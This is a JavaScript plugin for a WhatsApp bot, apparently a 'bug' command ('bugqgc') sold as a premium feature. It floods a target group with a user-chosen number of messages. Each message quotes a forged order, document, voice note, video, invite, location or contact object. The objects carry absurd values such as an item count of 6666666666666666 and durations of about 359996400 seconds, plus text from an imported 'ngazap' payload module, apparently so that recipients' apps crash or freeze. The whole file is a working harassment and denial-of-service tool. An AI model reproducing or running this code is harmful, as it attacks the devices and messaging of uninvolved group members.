let { ngazap } = require('../src/ngazap.js')

let handler = async(m, { conn, usedPrefix, command, text }) => {
    nome = text.split('|')[0]
    tekse = text.split('|')[1]
    juml = text.split('|')[2]
    quot = text.split('|')[3]
    if (!nome) throw `Example ${usedPrefix + command} 16472931368-1465602984|Teks|1|troli`
    if (!tekse) throw `Example ${usedPrefix + command} 16472931368-1465602984|Teks|1|troli`
    if (!juml) throw `Example ${usedPrefix + command} 16472931368-1465602984|Teks|1|troli`
    if (!quot) throw `Example ${usedPrefix + command} 16472931368-1465602984|Teks|1|troli`
    if (quot === "troli") {
    var troli = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) }, "message": {orderMessage: {itemCount: 6666666666666666,status: 200, thumbnail: null, surface: 200, message: `${ngazap(prefix)}`, orderTitle: `${ngazap(prefix)}`, sellerJid: '0@s.whatsapp.net'}}}
    for (let i = 0;i < juml;i++) {
        conn.sendMessage(`${nome}` + '@g.us', { text: tekse }, {quoted: troli})
        
    }
    } else if (quot === "doc") {
    var doc = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) }, "message": {documentMessage: {title: `${ngazap(prefix)} `,jpegThumbnail: null}}}
    for (let i = 0;i < juml;i++) {
        conn.sendMessage(`${nome}` + '@g.us', { text: tekse}, {quoted: doc})
        
    }
    } else if (quot === "vn"){
    var vn = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) },message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
    for (let i = 0;i < juml;i++) {
        conn.sendMessage(`${nome}` + '@g.us', { text: tekse}, {quoted: vn})
        
    }
    } else if (quot === "gif") {
		        var gif = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) },message: {"videoMessage": { "title":`${ngazap(prefix)}`, "h": `${ngazap(prefix)}`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `${ngazap(prefix)}`, 'jpegThumbnail': null}}}
		        for (let i = 0;i < juml;i++) {
        conn.sendMessage(`${nome}` + '@g.us', { text: tekse}, {quoted: gif})
        
    }
    } else if (quot === "gclink") {
		        var gclink = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) },"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": `${ngazap(prefix)}`, "caption": `${ngazap(prefix)}`, 'jpegThumbnail': null}}}
		        for (let i = 0;i < juml;i++) {
        conn.sendMessage(`${nome}` + '@g.us', { text: tekse}, {quoted: gclink})
        
    }
    } else if (quot === "video") {
		        var video = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) },message: { "videoMessage": { "title":`${ngazap(prefix)}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${ngazap(prefix)}`, 'jpegThumbnail': null}}}
		        for (let i = 0;i < juml;i++) {
        conn.sendMessage(`${nome}` + '@g.us', { text: tekse}, {quoted: video})
        
    }
    } else if (quot === "loc") {
		        var loc = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) },message: {locationMessage: {name: `${ngazap(prefix)}`,jpegThumbnail: null}}}
		        for (let i = 0;i < juml;i++) {
        conn.sendMessage(`${nome}` + '@g.us', { text: tekse}, {quoted: loc})
        
    }
    } else if (quot === "kontak") {
		        var kontak = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''}) }, message: { 'contactMessage': { 'displayName': `${ngazap(prefix)}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname} + ${ngazap(prefix)},;;;\nFN:${pushname} + ${ngazap(prefix)},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': null, thumbnail: null,sendEphemeral: true}}}
		        for (let i = 0;i < juml;i++) {
        conn.sendMessage(`${nome}` + '@g.us', { text: tekse}, {quoted: kontak})
    }
    } else if (quot) {
    throw `Masukkan quoted yg tersedia\n• troli\n• doc\n• vn\n• gif\n• gclink\n• video\n• loc\n• kontak`
}
}
handler.command = /^(bugqgc)$/i
handler.help = ['bugqgc']
handler.tags = ['premium']
handler.premium = true
module.exports = handler
